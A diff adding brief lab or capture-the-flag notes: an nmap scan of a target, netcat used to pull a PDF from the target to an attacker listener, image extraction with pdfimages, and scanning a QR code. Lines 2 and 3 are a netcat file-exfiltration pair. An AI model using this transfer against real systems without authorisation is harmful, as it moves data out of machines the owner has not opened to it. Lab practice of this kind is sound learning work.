@@ -1,0 +1,6 @@
+1 - nmap -A 10.10.153.185
+2 - nc 10.8.94.51 4444 < Repdf.pdf (target)
+3 - nc -lvnp 4444 > Repdf.pdf (attacker)
+4 - apt install poppler-utils
+5 - pdfimages -all Repdf.pdf images
+6 - scan qr code
